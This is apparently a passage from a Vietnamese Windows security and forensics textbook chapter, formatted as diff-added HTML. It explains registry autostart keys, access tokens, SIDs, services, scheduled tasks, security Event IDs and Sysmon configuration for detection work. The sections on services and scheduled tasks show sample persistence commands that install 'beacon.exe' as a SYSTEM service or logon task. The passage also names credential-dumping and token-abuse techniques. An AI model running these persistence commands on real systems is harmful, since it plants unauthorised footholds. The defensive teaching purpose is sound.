+<p>Giá trị <code>Start</code> trong Services hive (REG_DWORD):</p>
+<table>
+<thead>
+<tr>
+<th>Giá trị</th>
+<th>Tên</th>
+<th>Ý nghĩa</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>Boot</td>
+<td>Nạp bởi kernel loader (driver khởi động sớm)</td>
+</tr>
+<tr>
+<td>1</td>
+<td>System</td>
+<td>Nạp khi khởi tạo I/O</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Automatic</td>
+<td>Tự chạy lúc boot bởi SCM</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Manual</td>
+<td>Chạy khi có yêu cầu</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Disabled</td>
+<td>Bị tắt</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ch03-324-luu-y-bao-mat">3.2.4. Lưu ý bảo mật</h3>
+<ul>
+<li>Các khóa <strong>autostart extensibility points (ASEP)</strong> là nơi malware giành persistence: <code>...\CurrentVersion\Run</code>, <code>RunOnce</code>, <code>Image File Execution Options</code> (Debugger hijack), <code>Winlogon\Shell</code>, <code>Services</code>. Sysmon Event ID 12/13/14 ghi lại thay đổi registry.</li>
+<li>Hive <code>SAM</code>/<code>SECURITY</code> chứa hash mật khẩu cục bộ + LSA secrets — bị bảo vệ bởi SYSTEM ACL nhưng có thể dump offline (sao chép Volume Shadow Copy) → kỹ thuật <code>secretsdump</code>.</li>
+</ul>
+<hr />
+<h2 id="ch03-33-process-thread-va-access-token">3.3. Process, Thread và Access Token</h2>
+<h3 id="ch03-331-process-va-thread-cau-truc">3.3.1. Process và Thread — cấu trúc</h3>
+<p>Một <strong>process</strong> là container (không gian địa chỉ + handle table + token), <strong>thread</strong> mới là đơn vị được lập lịch. Cấu trúc kernel:</p>
+<ul>
+<li><code>EPROCESS</code>: block điều khiển process trong kernel (con trỏ tới page directory <code>DirectoryTableBase</code>/CR3, danh sách thread, <code>Token</code>, PID, PPID <code>InheritedFromUniqueProcessId</code>...).</li>
+<li><code>ETHREAD</code>/<code>KTHREAD</code>: control block thread.</li>
+<li><code>PEB</code> (Process Environment Block, user-mode): chứa <code>ImageBaseAddress</code>, danh sách module nạp (<code>Ldr</code>), command line, biến môi trường.</li>
+</ul>
+<blockquote>
+<p><strong>Lưu ý:</strong> trường <code>InheritedFromUniqueProcessId</code> trong EPROCESS chính là PPID mà Sysmon ghi vào Event ID 1 — quan trọng để phát hiện parent-child bất thường (ví dụ <code>winword.exe</code> sinh <code>cmd.exe</code>).</p>
+</blockquote>
+<h3 id="ch03-332-access-token-co-che-cap-quyen">3.3.2. Access Token — cơ chế cấp quyền</h3>
+<p>Khi user đăng nhập, <strong>LSASS</strong> sinh một <strong>access token</strong> đại diện security context. Mọi thread mặc định dùng token của process; có thể <strong>impersonate</strong> token khác.</p>
+<p>Cấu trúc logic của token (truy cập qua <code>GetTokenInformation</code>):</p>
+<table>
+<thead>
+<tr>
+<th>Thành phần</th>
+<th>Ý nghĩa</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>User SID</td>
+<td>Danh tính chính của chủ token</td>
+</tr>
+<tr>
+<td>Group SIDs</td>
+<td>Danh sách nhóm + thuộc tính (Enabled, UseForDenyOnly...)</td>
+</tr>
+<tr>
+<td>Privileges</td>
+<td>Danh sách <code>LUID</code> + attributes (ví dụ <code>SeDebugPrivilege</code>, <code>SeBackupPrivilege</code>)</td>
+</tr>
+<tr>
+<td>Owner SID, Primary Group</td>
+<td>Mặc định gán cho object mới tạo</td>
+</tr>
+<tr>
+<td>Default DACL</td>
+<td>DACL mặc định cho object do token tạo</td>
+</tr>
+<tr>
+<td>Token Type</td>
+<td>Primary (gắn process) hoặc Impersonation</td>
+</tr>
+<tr>
+<td>Impersonation Level</td>
+<td>Anonymous / Identification / Impersonation / Delegation</td>
+</tr>
+<tr>
+<td>Integrity Level</td>
+<td>Mandatory Integrity Control: Low/Medium/High/System</td>
+</tr>
+<tr>
+<td>Logon SID, Session ID</td>
+<td>Phiên đăng nhập</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ch03-333-sid-security-identifier-cau-truc-nhi-phan">3.3.3. SID — Security Identifier (cấu trúc nhị phân)</h3>
+<p>SID nhận diện duy nhất một principal (user, group, máy, domain). Dạng chuỗi: <code>S-1-5-21-&lt;domain&gt;-&lt;RID&gt;</code>.</p>
+<p>Cấu trúc nhị phân:</p>
+<table>
+<thead>
+<tr>
+<th>Offset</th>
+<th>Kích thước</th>
+<th>Trường</th>
+<th>Ý nghĩa</th>
+<th>Ví dụ</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x00</td>
+<td>1 byte</td>
+<td>Revision</td>
+<td>Luôn = 1</td>
+<td><code>0x01</code></td>
+</tr>
+<tr>
+<td>0x01</td>
+<td>1 byte</td>
+<td>SubAuthorityCount</td>
+<td>Số sub-authority (tối đa 15)</td>
+<td><code>0x05</code></td>
+</tr>
+<tr>
+<td>0x02</td>
+<td>6 byte</td>
+<td>IdentifierAuthority</td>
+<td>Big-endian, ví dụ 5 = NT Authority</td>
+<td><code>00 00 00 00 00 05</code></td>
+</tr>
+<tr>
+<td>0x08</td>
+<td>4×N byte</td>
+<td>SubAuthority[]</td>
+<td>Mỗi cái 32-bit little-endian</td>
+<td><code>21 ...</code> rồi RID</td>
+</tr>
+</tbody>
+</table>
+<p>Chuỗi <code>S-1-5-21-...</code> giải mã: <code>S</code>=SID, <code>1</code>=revision, <code>5</code>=IdentifierAuthority (NT), tiếp theo là các sub-authority. <strong>RID</strong> là sub-authority cuối.</p>
+<p>RID quan trọng cố định (well-known):</p>
+<table>
+<thead>
+<tr>
+<th>RID / SID</th>
+<th>Tên</th>
+<th>Ý nghĩa</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>500</td>
+<td>Administrator</td>
+<td>Tài khoản quản trị tích hợp</td>
+</tr>
+<tr>
+<td>501</td>
+<td>Guest</td>
+<td>Khách</td>
+</tr>
+<tr>
+<td>512</td>
+<td>Domain Admins</td>
+<td>Nhóm admin domain</td>
+</tr>
+<tr>
+<td>513</td>
+<td>Domain Users</td>
+<td>-</td>
+</tr>
+<tr>
+<td>519</td>
+<td>Enterprise Admins</td>
+<td>Admin toàn forest</td>
+</tr>
+<tr>
+<td><code>S-1-5-18</code></td>
+<td>LocalSystem</td>
+<td>Tài khoản SYSTEM</td>
+</tr>
+<tr>
+<td><code>S-1-5-32-544</code></td>
+<td>Builtin\Administrators</td>
+<td>-</td>
+</tr>
+<tr>
+<td><code>S-1-1-0</code></td>
+<td>Everyone</td>
+<td>-</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ch03-334-vi-du-thuc-te">3.3.4. Ví dụ thực tế</h3>
+<pre><code class="language-powershell"># Xem token của tiến trình hiện tại: SID, group, privilege
+whoami /all
+
+# whoami /priv -&gt; liệt kê privilege và trạng thái Enabled/Disabled
+#   SeDebugPrivilege   Debug programs   Disabled
+</code></pre>
+<pre><code class="language-cmd">:: Chuyển SID &lt;-&gt; tên (dùng để điều tra audit log)
+:: PsGetSid của Sysinternals
+PsGetSid.exe \\dc01 username
+:: hoặc dùng PowerShell:
+</code></pre>
+<pre><code class="language-powershell">$sid = (New-Object System.Security.Principal.NTAccount(&quot;CORP&quot;,&quot;jdoe&quot;)).Translate([System.Security.Principal.SecurityIdentifier])
+$sid.Value      # S-1-5-21-...-1107
+</code></pre>
+<h3 id="ch03-335-luu-y-bao-mat">3.3.5. Lưu ý bảo mật</h3>
+<ul>
+<li><code>SeDebugPrivilege</code> cho phép mở handle PROCESS_ALL_ACCESS tới mọi process kể cả LSASS → đọc bộ nhớ dump hash. Theo dõi việc bật privilege này.</li>
+<li><strong>Token impersonation/theft</strong>: malware có <code>SeImpersonatePrivilege</code> (mặc định có ở service account) lợi dụng để impersonate SYSTEM (họ tấn công "Potato": JuicyPotato/RoguePotato/PrintSpoofer).</li>
+<li><strong>Integrity Level</strong> thấp (Low) là sandbox của trình duyệt; UAC dùng IL để tách token Medium (user thường) và High (admin elevated).</li>
+</ul>
+<hr />
+<h2 id="ch03-34-services-va-scheduled-tasks">3.4. Services và Scheduled Tasks</h2>
+<h3 id="ch03-341-services">3.4.1. Services</h3>
+<p><strong>Service Control Manager (SCM)</strong> = <code>services.exe</code>, quản lý vòng đời dịch vụ. Cấu hình lưu ở <code>HKLM\SYSTEM\CurrentControlSet\Services\&lt;Name&gt;</code>:</p>
+<table>
+<thead>
+<tr>
+<th>Value</th>
+<th>Kiểu</th>
+<th>Ý nghĩa</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ImagePath</code></td>
+<td>REG_EXPAND_SZ</td>
+<td>Đường dẫn binary (hoặc <code>svchost.exe -k &lt;group&gt;</code> cho service trong DLL)</td>
+</tr>
+<tr>
+<td><code>Start</code></td>
+<td>REG_DWORD</td>
+<td>0–4 (xem bảng 3.2.3)</td>
+</tr>
+<tr>
+<td><code>Type</code></td>
+<td>REG_DWORD</td>
+<td>0x10=own process, 0x20=share process, 0x1=kernel driver</td>
+</tr>
+<tr>
+<td><code>ObjectName</code></td>
+<td>REG_SZ</td>
+<td>Tài khoản chạy (<code>LocalSystem</code>, <code>NT AUTHORITY\NetworkService</code>...)</td>
+</tr>
+<tr>
+<td><code>ServiceDll</code></td>
+<td>REG_SZ (subkey Parameters)</td>
+<td>DLL với service dạng svchost</td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-cmd">:: Tạo service mới (kỹ thuật persistence/lateral movement phổ biến)
+sc create EvilSvc binPath= &quot;C:\temp\beacon.exe&quot; start= auto
+sc qc Dnscache           :: query config
+sc query Dnscache        :: trạng thái runtime
+</code></pre>
+<blockquote>
+<p><strong>Vì sao:</strong> <code>svchost.exe -k netsvcs</code> gom nhiều service nhẹ vào một process để tiết kiệm tài nguyên. Tác dụng phụ bảo mật: nhiều service chạy chung token → bề mặt lớn, khó phân biệt service nào lỗi.</p>
+</blockquote>
+<p><strong>Lưu ý:</strong> Event ID <strong>7045</strong> (System log) = "A new service was installed" — tín hiệu mạnh cho lateral movement (PsExec tạo service <code>PSEXESVC</code>). <strong>Unquoted service path</strong> + ghi được vào thư mục cha = leo thang quyền cổ điển.</p>
+<h3 id="ch03-342-scheduled-tasks">3.4.2. Scheduled Tasks</h3>
+<p>Lưu tại <code>C:\Windows\System32\Tasks\&lt;TaskName&gt;</code> (XML) + đăng ký trong registry <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache</code>.</p>
+<p>Ví dụ XML task chạy khi logon:</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-16&quot;?&gt;
+&lt;Task version=&quot;1.2&quot; xmlns=&quot;http://schemas.microsoft.com/windows/2004/02/mit/task&quot;&gt;
+  &lt;Triggers&gt;
+    &lt;LogonTrigger&gt;&lt;Enabled&gt;true&lt;/Enabled&gt;&lt;/LogonTrigger&gt;
+  &lt;/Triggers&gt;
+  &lt;Principals&gt;
+    &lt;Principal id=&quot;Author&quot;&gt;
+      &lt;UserId&gt;S-1-5-18&lt;/UserId&gt;          &lt;!-- chạy với quyền SYSTEM --&gt;
+      &lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt;
+    &lt;/Principal&gt;
+  &lt;/Principals&gt;
+  &lt;Actions&gt;
+    &lt;Exec&gt;&lt;Command&gt;C:\temp\beacon.exe&lt;/Command&gt;&lt;/Exec&gt;
+  &lt;/Actions&gt;
+&lt;/Task&gt;
+</code></pre>
+<pre><code class="language-cmd">:: Tạo task chạy mỗi khi user logon
+schtasks /create /tn &quot;Updater&quot; /tr &quot;C:\temp\beacon.exe&quot; /sc onlogon /ru SYSTEM
+</code></pre>
+<p><strong>Lưu ý:</strong> Event ID <strong>4698</strong> (task created), <strong>4702</strong> (updated) trong Security log; <strong>106/200/201</strong> trong <code>Microsoft-Windows-TaskScheduler/Operational</code>. Chạy <code>SYSTEM</code> + trigger logon = persistence cần soi.</p>
+<hr />
+<h2 id="ch03-35-windows-event-log-cac-event-id-bao-mat-cot-loi">3.5. Windows Event Log — các Event ID bảo mật cốt lõi</h2>
+<h3 id="ch03-351-co-che-đinh-dang-evtx">3.5.1. Cơ chế: định dạng EVTX</h3>
+<p>Event log hiện đại (Vista+) lưu file <code>.evtx</code> (<code>C:\Windows\System32\winevt\Logs\Security.evtx</code>) dạng nhị phân binary XML. Cấu trúc:</p>
+<ul>
+<li><strong>File header (<code>ElfFile\0</code>, 4096 byte)</strong>: chữ ký <code>45 6C 66 46 69 6C 65 00</code>, chứa first/last chunk number, next record ID.</li>
+<li><strong>Chunk (65536 byte mỗi cái)</strong>: chữ ký <code>ElfChnk\0</code>, mỗi chunk chứa nhiều <strong>event record</strong>.</li>
+<li><strong>Event record</strong>: chữ ký <code>0x2A2A</code> (<code>**</code>), kích thước, <strong>EventRecordID</strong> (64-bit), timestamp FILETIME, rồi payload <strong>Binary XML</strong> (BinXML — token-based để nén tên phần tử/thuộc tính lặp lại).</li>
+</ul>
+<pre><code>ElfFile\0 header (4096B)
+└── Chunk 0 (64KB)  [ElfChnk\0]
+     ├── Record (** | size | RecordID | FileTime | BinXML)
+     ├── Record ...
+└── Chunk 1 (64KB) ...
+</code></pre>
+<p>Mỗi event được render thành XML với <code>&lt;System&gt;</code> (Provider, EventID, TimeCreated, Computer, Security UserID) và <code>&lt;EventData&gt;</code> (các <code>&lt;Data Name="..."&gt;</code>).</p>
+<h3 id="ch03-352-event-4624-đang-nhap-thanh-cong">3.5.2. Event 4624 — Đăng nhập thành công</h3>
+<p>Đây là event quan trọng nhất. Các trường <code>&lt;EventData&gt;</code> chính:</p>
+<table>
+<thead>
+<tr>
+<th>Trường</th>
+<th>Ý nghĩa</th>
+<th>Ví dụ</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>SubjectUserSid</code></td>
+<td>SID chủ thể yêu cầu logon (thường SYSTEM)</td>
+<td>S-1-5-18</td>
+</tr>
+<tr>
+<td><code>TargetUserName</code></td>
+<td>Tài khoản đăng nhập</td>
+<td>jdoe</td>
+</tr>
+<tr>
+<td><code>TargetDomainName</code></td>
+<td>Domain</td>
+<td>CORP</td>
+</tr>
+<tr>
+<td><code>TargetUserSid</code></td>
+<td>SID người đăng nhập</td>
+<td>S-1-5-21-...-1107</td>
+</tr>
+<tr>
+<td><code>LogonType</code></td>
+<td>Kiểu đăng nhập (xem bảng)</td>
+<td>3</td>
+</tr>
+<tr>
+<td><code>LogonProcessName</code></td>
+<td>Tiến trình xác thực</td>
+<td>Kerberos / NtLmSsp / User32</td>
+</tr>
+<tr>
+<td><code>AuthenticationPackageName</code></td>
+<td>Gói auth</td>
+<td>Kerberos / NTLM / Negotiate</td>
+</tr>
+<tr>
+<td><code>WorkstationName</code></td>
+<td>Máy nguồn (NTLM)</td>
+<td>WS01</td>
+</tr>
+<tr>
+<td><code>IpAddress</code></td>
+<td>IP nguồn</td>
+<td>10.0.0.5</td>
+</tr>
+<tr>
+<td><code>LogonGuid</code></td>
+<td>GUID liên kết với 4769 (Kerberos)</td>
+<td>{…}</td>
+</tr>
+<tr>
+<td><code>ElevatedToken</code></td>
+<td>%%1842 (Yes) nếu token elevated</td>
+<td>-</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Logon Type</strong> — cốt lõi để hiểu cách truy cập:</p>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Tên</th>
+<th>Ý nghĩa</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2</td>
+<td>Interactive</td>
+<td>Đăng nhập tại bàn phím (hoặc RDP qua console)</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Network</td>
+<td>Đăng nhập mạng: truy cập tài nguyên qua mạng (SMB, IIS) — <strong>không</strong> lưu credential trên máy đích</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Batch</td>
+<td>Scheduled task</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Service</td>
+<td>SCM khởi động service</td>
+</tr>
+<tr>
+<td>7</td>
+<td>Unlock</td>
+<td>Mở khóa màn hình</td>
+</tr>
+<tr>
+<td>8</td>
+<td>NetworkCleartext</td>
+<td>Mật khẩu gửi cleartext (IIS Basic Auth)</td>
+</tr>
+<tr>
+<td>9</td>
+<td>NewCredentials</td>
+<td><code>runas /netonly</code> — credential mới cho kết nối mạng (dấu hiệu pass-the-hash với Mimikatz!)</td>
+</tr>
+<tr>
+<td>10</td>
+<td>RemoteInteractive</td>
+<td>RDP / Terminal Services (kể cả RDP qua NLA)</td>
+</tr>
+<tr>
+<td>11</td>
+<td>CachedInteractive</td>
+<td>Đăng nhập bằng cached credential (offline)</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>Cảnh báo:</strong> Logon Type 9 rất đáng ngờ. Mimikatz <code>sekurlsa::pth</code> tạo logon session type 9 + LogonProcessName <code>seclogo</code>. Săn: 4624 type 9 + process là <code>mimikatz</code>/<code>rundll32</code> bất thường.</p>
+</blockquote>
+<h3 id="ch03-353-event-4625-đang-nhap-that-bai">3.5.3. Event 4625 — Đăng nhập thất bại</h3>
+<p>Thêm trường <code>Status</code>/<code>SubStatus</code> (mã NTSTATUS) cho biết lý do:</p>
+<table>
+<thead>
+<tr>
+<th>SubStatus</th>
+<th>Ý nghĩa</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>0xC0000064</code></td>
+<td>User không tồn tại</td>
+</tr>
+<tr>
+<td><code>0xC000006A</code></td>
+<td>Sai mật khẩu</td>
+</tr>
+<tr>
+<td><code>0xC0000234</code></td>
+<td>Tài khoản bị khóa (locked out)</td>
+</tr>
+<tr>
+<td><code>0xC0000072</code></td>
+<td>Tài khoản bị disable</td>
+</tr>
+<tr>
+<td><code>0xC0000193</code></td>
+<td>Tài khoản hết hạn</td>
+</tr>
+<tr>
+<td><code>0xC000006F</code></td>
+<td>Đăng nhập ngoài giờ cho phép</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>Lưu ý:</strong> săn brute-force/password spraying. Nhiều 4625 <code>0xC000006A</code> từ một IP tới nhiều TargetUserName là spraying; tới một user nhiều lần là brute force.</p>
+</blockquote>
+<h3 id="ch03-354-cac-event-id-security-khac">3.5.4. Các Event ID Security khác</h3>
+<table>
+<thead>
+<tr>
+<th>Event ID</th>
+<th>Ý nghĩa</th>
+<th>Trường/ghi chú quan trọng</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>4634</strong></td>
+<td>Logoff</td>
+<td><code>LogonType</code>, <code>TargetLogonId</code> (khớp với 4624)</td>
+</tr>
+<tr>
+<td><strong>4647</strong></td>
+<td>User-initiated logoff</td>
+<td>-</td>
+</tr>
+<tr>
+<td><strong>4672</strong></td>
+<td>Special privileges assigned to new logon</td>
+<td>Sinh kèm mỗi logon admin; <code>PrivilegeList</code> chứa SeDebug/SeBackup... → dùng dò admin logon</td>
+</tr>
+<tr>
+<td><strong>4688</strong></td>
+<td>A new process has been created</td>
+<td><code>NewProcessName</code>, <code>ProcessId</code>, <code>CommandLine</code> (cần bật audit "Include command line"), <code>ParentProcessName</code>, <code>TokenElevationType</code></td>
+</tr>
+<tr>
+<td><strong>4720</strong></td>
+<td>A user account was created</td>
+<td><code>TargetUserName</code>, <code>SubjectUserName</code> (ai tạo)</td>
+</tr>
+<tr>
+<td><strong>4722/4725/4726</strong></td>
+<td>Account enabled / disabled / deleted</td>
+<td>-</td>
+</tr>
+<tr>
+<td><strong>4728/4732/4756</strong></td>
+<td>Member added to global/local/universal group</td>
+<td>Theo dõi thêm vào Domain Admins</td>
+</tr>
+<tr>
+<td><strong>4768</strong></td>
+<td>Kerberos TGT requested (AS-REQ)</td>
+<td><code>TicketEncryptionType</code>, <code>PreAuthType</code>, IP client</td>
+</tr>
+<tr>
+<td><strong>4769</strong></td>
+<td>Kerberos service ticket requested (TGS-REQ)</td>
+<td><code>ServiceName</code>, <code>TicketEncryptionType</code> (0x17=RC4 → Kerberoasting!)</td>
+</tr>
+<tr>
+<td><strong>4771</strong></td>
+<td>Kerberos pre-authentication failed</td>
+<td><code>FailureCode</code> (0x18 = sai mật khẩu)</td>
+</tr>
+<tr>
+<td><strong>4776</strong></td>
+<td>NTLM credential validation (DC)</td>
+<td><code>Status</code></td>
+</tr>
+<tr>
+<td><strong>1102</strong></td>
+<td>The audit log was cleared</td>
+<td>Trường <code>SubjectUserName</code>/<code>SubjectUserSid</code> — ai xóa log</td>
+</tr>
+<tr>
+<td><strong>4719</strong></td>
+<td>System audit policy was changed</td>
+<td>Kẻ tấn công tắt audit</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ch03-355-event-4688-chi-tiet-command-line">3.5.5. Event 4688 — chi tiết command line</h3>
+<p>Mặc định 4688 <strong>không</strong> chứa command line. Phải bật:</p>
+<pre><code class="language-cmd">:: Bật ghi command line trong 4688 (GPO: Administrative Templates &gt;
+::   System &gt; Audit Process Creation)
+reg add &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit&quot; ^
+  /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f
+
+:: Bật audit subcategory &quot;Process Creation&quot;
+auditpol /set /subcategory:&quot;Process Creation&quot; /success:enable /failure:enable
+</code></pre>
+<p>Sau khi bật, một event 4688 mẫu (rút gọn):</p>
+<pre><code class="language-xml">&lt;EventData&gt;
+  &lt;Data Name=&quot;NewProcessName&quot;&gt;C:\Windows\System32\cmd.exe&lt;/Data&gt;
+  &lt;Data Name=&quot;ProcessId&quot;&gt;0x1a2c&lt;/Data&gt;
+  &lt;Data Name=&quot;CommandLine&quot;&gt;cmd.exe /c whoami /all&lt;/Data&gt;
+  &lt;Data Name=&quot;ParentProcessName&quot;&gt;C:\Program Files\Microsoft Office\WINWORD.EXE&lt;/Data&gt;
+  &lt;Data Name=&quot;TokenElevationType&quot;&gt;%%1936&lt;/Data&gt;   &lt;!-- Type 1 = full token --&gt;
+  &lt;Data Name=&quot;SubjectUserName&quot;&gt;jdoe&lt;/Data&gt;
+&lt;/EventData&gt;
+</code></pre>
+<p><code>TokenElevationType</code>: <code>%%1936</code> (Type 1, full token, không UAC split), <code>%%1937</code> (Type 2, elevated qua UAC), <code>%%1938</code> (Type 3, limited).</p>
+<h3 id="ch03-356-event-1102-audit-log-cleared">3.5.6. Event 1102 — Audit log cleared</h3>
+<pre><code class="language-xml">&lt;UserData&gt;
+  &lt;LogFileCleared&gt;
+    &lt;SubjectUserSid&gt;S-1-5-21-...-1107&lt;/SubjectUserSid&gt;
+    &lt;SubjectUserName&gt;attacker&lt;/SubjectUserName&gt;
+    &lt;SubjectDomainName&gt;CORP&lt;/SubjectDomainName&gt;
+  &lt;/LogFileCleared&gt;
+&lt;/UserData&gt;
+</code></pre>
+<blockquote>
+<p><strong>Lưu ý:</strong> 1102 (Security) và 104 (System, log khác bị clear) là chỉ báo anti-forensic. Forward log realtime (WEF/Sysmon→SIEM) trước khi attacker clear là biện pháp đối phó.</p>
+</blockquote>
+<hr />
+<h2 id="ch03-36-sysmon-system-monitor">3.6. Sysmon — System Monitor</h2>
+<h3 id="ch03-361-la-gi">3.6.1. Là gì</h3>
+<p>Sysmon (Sysinternals) là driver + service ghi log telemetry chi tiết vào <code>Microsoft-Windows-Sysmon/Operational</code>. Vượt xa audit native vì có <strong>hash file, GUID process, ánh xạ network→process, command line đầy đủ, ProcessGUID nối các event</strong>.</p>
+<h3 id="ch03-362-cac-event-id-sysmon-trong-yeu">3.6.2. Các Event ID Sysmon trọng yếu</h3>
+<table>
+<thead>
+<tr>
+<th>Event ID</th>
+<th>Sự kiện</th>
+<th>Trường nổi bật</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>1</strong></td>
+<td>Process creation</td>
+<td><code>Image</code>, <code>CommandLine</code>, <code>Hashes</code>, <code>ParentImage</code>, <code>ParentCommandLine</code>, <code>ProcessGuid</code>, <code>User</code>, <code>IntegrityLevel</code>, <code>OriginalFileName</code></td>
+</tr>
+<tr>
+<td><strong>3</strong></td>
+<td>Network connection</td>
+<td><code>Image</code>, <code>Protocol</code>, <code>SourceIp/Port</code>, <code>DestinationIp/Port</code>, <code>DestinationHostname</code></td>
+</tr>
+<tr>
+<td><strong>5</strong></td>
+<td>Process terminated</td>
+<td><code>ProcessGuid</code>, <code>Image</code></td>
+</tr>
+<tr>
+<td><strong>7</strong></td>
+<td>Image (DLL) loaded</td>
+<td><code>ImageLoaded</code>, <code>Signed</code>, <code>Signature</code>, <code>SignatureStatus</code>, <code>Hashes</code> — phát hiện DLL hijacking/unsigned DLL</td>
+</tr>
+<tr>
+<td><strong>8</strong></td>
+<td>CreateRemoteThread</td>
+<td><code>SourceImage</code>, <code>TargetImage</code>, <code>StartAddress</code> — phát hiện process injection</td>
+</tr>
+<tr>
+<td><strong>10</strong></td>
+<td>ProcessAccess</td>
+<td><code>SourceImage</code>, <code>TargetImage</code>, <code>GrantedAccess</code> — phát hiện đọc LSASS (0x1010/0x1410)</td>
+</tr>
+<tr>
+<td><strong>11</strong></td>
+<td>File created</td>
+<td><code>TargetFilename</code>, <code>CreationUtcTime</code> — drop payload</td>
+</tr>
+<tr>
+<td><strong>12/13/14</strong></td>
+<td>Registry key/value/rename</td>
+<td><code>TargetObject</code>, <code>Details</code> — persistence ASEP</td>
+</tr>
+<tr>
+<td><strong>22</strong></td>
+<td>DNS query</td>
+<td><code>QueryName</code>, <code>QueryResults</code>, <code>Image</code> — phát hiện C2/DGA</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ch03-363-cau-hinh-xml-thuc-te">3.6.3. Cấu hình XML thực tế</h3>
+<p>Sysmon dùng file config XML với schema versioning. Ví dụ config tối giản nhưng hiệu quả:</p>
+<pre><code class="language-xml">&lt;Sysmon schemaversion=&quot;4.90&quot;&gt;
+  &lt;HashAlgorithms&gt;SHA256,IMPHASH&lt;/HashAlgorithms&gt;
+  &lt;EventFiltering&gt;
+
+    &lt;!-- EID 1: ghi mọi process, nhưng loại bớt nhiễu --&gt;
+    &lt;RuleGroup name=&quot;ProcCreate&quot; groupRelation=&quot;or&quot;&gt;
+      &lt;ProcessCreate onmatch=&quot;exclude&quot;&gt;
+        &lt;Image condition=&quot;is&quot;&gt;C:\Windows\System32\SearchIndexer.exe&lt;/Image&gt;
+      &lt;/ProcessCreate&gt;
+    &lt;/RuleGroup&gt;
+
+    &lt;!-- EID 10: cảnh báo truy cập LSASS --&gt;
+    &lt;RuleGroup name=&quot;LsassAccess&quot; groupRelation=&quot;or&quot;&gt;
+      &lt;ProcessAccess onmatch=&quot;include&quot;&gt;
+        &lt;TargetImage condition=&quot;image&quot;&gt;lsass.exe&lt;/TargetImage&gt;
+      &lt;/ProcessAccess&gt;
+    &lt;/RuleGroup&gt;
+
+    &lt;!-- EID 22: log mọi DNS query trừ domain Microsoft tin cậy --&gt;
+    &lt;RuleGroup name=&quot;Dns&quot; groupRelation=&quot;or&quot;&gt;
+      &lt;DnsQuery onmatch=&quot;exclude&quot;&gt;
+        &lt;QueryName condition=&quot;end with&quot;&gt;.microsoft.com&lt;/QueryName&gt;
+      &lt;/DnsQuery&gt;
+    &lt;/RuleGroup&gt;
+
+    &lt;!-- EID 13: persistence registry --&gt;
+    &lt;RuleGroup name=&quot;RegPersist&quot; groupRelation=&quot;or&quot;&gt;
+      &lt;RegistryEvent onmatch=&quot;include&quot;&gt;
+        &lt;TargetObject condition=&quot;contains&quot;&gt;\CurrentVersion\Run&lt;/TargetObject&gt;
+      &lt;/RegistryEvent&gt;
+    &lt;/RuleGroup&gt;
+
+  &lt;/EventFiltering&gt;
+&lt;/Sysmon&gt;
+</code></pre>
+<p>Giải thích tham số:
+- <code>onmatch="include"</code>: chỉ ghi event khớp rule (whitelist). <code>onmatch="exclude"</code>: ghi mọi event trừ cái khớp (blacklist).
+- <code>groupRelation="or"</code>: chỉ cần 1 rule trong group khớp.
+- <code>condition</code>: <code>is</code>, <code>contains</code>, <code>begin with</code>, <code>end with</code>, <code>image</code> (so khớp tên file bỏ qua path), <code>regex</code>...</p>
+<pre><code class="language-cmd">:: Cài đặt Sysmon với config
+Sysmon64.exe -accepteula -i sysmonconfig.xml
+
+:: Cập nhật config mà không cài lại
+Sysmon64.exe -c sysmonconfig.xml
+</code></pre>
+<p>Một Event ID 1 mẫu (rút gọn):</p>
+<pre><code class="language-xml">&lt;EventData&gt;
+  &lt;Data Name=&quot;UtcTime&quot;&gt;2026-06-19 03:21:55.123&lt;/Data&gt;
+  &lt;Data Name=&quot;ProcessGuid&quot;&gt;{a1b2...}&lt;/Data&gt;
+  &lt;Data Name=&quot;ProcessId&quot;&gt;6948&lt;/Data&gt;
+  &lt;Data Name=&quot;Image&quot;&gt;C:\Windows\System32\cmd.exe&lt;/Data&gt;
+  &lt;Data Name=&quot;CommandLine&quot;&gt;cmd /c &quot;powershell -enc SQBFAFgA...&quot;&lt;/Data&gt;
+  &lt;Data Name=&quot;Hashes&quot;&gt;SHA256=...,IMPHASH=...&lt;/Data&gt;
+  &lt;Data Name=&quot;ParentImage&quot;&gt;C:\Program Files\...\WINWORD.EXE&lt;/Data&gt;
+  &lt;Data Name=&quot;ParentCommandLine&quot;&gt;&quot;WINWORD.EXE&quot; /n invoice.docx&lt;/Data&gt;
+  &lt;Data Name=&quot;User&quot;&gt;CORP\jdoe&lt;/Data&gt;
+  &lt;Data Name=&quot;IntegrityLevel&quot;&gt;Medium&lt;/Data&gt;
+&lt;/EventData&gt;
+</code></pre>
+<blockquote>
